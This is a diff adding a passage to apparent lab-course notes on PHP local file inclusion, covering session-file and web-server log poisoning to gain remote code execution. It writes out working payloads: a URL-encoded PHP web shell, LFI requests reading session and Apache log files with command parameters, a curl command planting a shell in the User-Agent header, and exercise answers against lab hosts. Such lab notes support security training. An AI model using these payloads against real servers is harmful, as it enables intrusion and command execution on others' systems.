@@ -229,7 +229,7 @@ And if we combine this to our LFI, we can get RCE ->
 http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
 ```
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 Let's utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work.
 
@@ -280,3 +280,115 @@ http://83.136.255.43:42260/index.php?language=phar://./profile_images/shell.jpg%
 ## Log Poisoning
 
 Here we are going to be writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code. for this to work the PHP web app must have read privileges over the logged files
+
+`PHPSESSID` cookies hold user data in the back end and stores it in session files in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows.&#x20;
+
+The name is based on the cookie with the `sess_`prefix
+
+So if `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.
+
+Let's take the following web app:
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+So if we go and look for this ->
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+```
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+We see the 2 values, we never specified preferences so it must be automatic value but we control pages via our language parameter. Let's try this out ->
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
+```
+
+Now we can go back and look at the session file:
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+So we can control the value of `page` in the session file. Now let's write PHP in the session file with a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+And call it with the following request:
+
+```
+http://<SERVER_IP>:/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion.
+{% endhint %}
+
+### Server Log Poisoning
+
+`Apache` and `Nginx` have log files such as  `access.log` and `error.log`. `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header and we'd like to poison this header.
+
+To include the logs through LFI we need to have read-access over the logs. `Nginx` logs are readable by low privileged users but `Apache` logs are only readable by users with high privileges but in some old apache versions it's worth taking the shot
+
+By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows but we can try and use [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.
+
+Let's try accessing the log:
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
+```
+
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+We remember that the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.
+
+Just to be sure:
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+So to exploit:
+
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+Or through curl:
+
+```
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+```
+
+And for the POC:
+
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Here are some of the service logs we may be able to read:
+
+* `/var/log/sshd.log`
+* `/var/log/mail`
+* `/var/log/vsftpd.log`
+
+_**Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd**_
+
+<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption><p><a href="http://94.237.53.113:51351/index.php?language=/var/lib/php/sessions/sess_nmcii850mqvpi48m9pah4vufd4">http://94.237.53.113:51351/index.php?language=/var/lib/php/sessions/sess_nmcii850mqvpi48m9pah4vufd4</a></p></figcaption></figure>
+
+```
+language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+```
+
+```
+language=/var/lib/php/sessions/sess_nmcii850mqvpi48m9pah4vufd4&cmd=pwd
+```
+
+<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+_**Try to use a different technique to gain RCE and read the flag at /**_
+
+<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption><p>?language=/var/log/apache2/access.log&#x26;cmd=ls+/</p></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
